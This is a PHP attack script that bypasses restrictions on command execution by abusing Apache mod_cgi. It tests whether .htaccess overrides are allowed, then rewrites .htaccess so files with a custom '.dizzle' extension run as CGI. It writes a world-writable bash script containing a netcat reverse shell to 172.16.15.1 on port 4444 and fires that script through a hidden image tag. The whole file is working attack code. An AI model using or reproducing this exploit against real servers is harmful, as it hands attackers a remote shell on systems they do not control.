<?php
$cmd = "nc -c '/bin/bash' 172.16.15.1 4444"; //command to be executed
$shellfile = "#!/bin/bash\n"; //using a shellscript
$shellfile .= "echo -ne \"Content-Type: text/html\\n\\n\"\n"; //header is needed, otherwise a 500 error is thrown when there is output
$shellfile .= "$cmd"; //executing $cmd
function checkEnabled($text, $condition, $yes, $no) //this surely can be shorter
{
	echo "$text: " . ($condition ? $yes : $no) . "<br>\n";
}
if (!isset($_GET['checked'])) {
	@file_put_contents('.htaccess', "\nSetEnv HTACCESS on", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed
	header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked
} else {
	$modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled?
	$writable = is_writable('.'); //current dir writable?
	$htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled?
	checkEnabled("Mod-Cgi enabled", $modcgi, "Yes", "No");
	checkEnabled("Is writable", $writable, "Yes", "No");
	checkEnabled("htaccess working", $htaccess, "Yes", "No");
	if (!($modcgi && $writable && $htaccess)) {
		echo "Error. All of the above must be true for the script to work!"; //abort if not
	} else {
		checkEnabled("Backing up .htaccess", copy(".htaccess", ".htaccess.bak"), "Suceeded! Saved in .htaccess.bak", "Failed!"); //make a backup, cause you never know.
		checkEnabled("Write .htaccess file", file_put_contents('.htaccess', "Options +ExecCGI\nAddHandler cgi-script .dizzle"), "Succeeded!", "Failed!"); //.dizzle is a nice extension
		checkEnabled("Write shell file", file_put_contents('shell.dizzle', $shellfile), "Succeeded!", "Failed!"); //write the file
		checkEnabled("Chmod 777", chmod("shell.dizzle", 0777), "Succeeded!", "Failed!"); //rwx
		echo "Executing the script now. Check your listener <img src = 'shell.dizzle' style = 'display:none;'>"; //call the script
	}
}
?>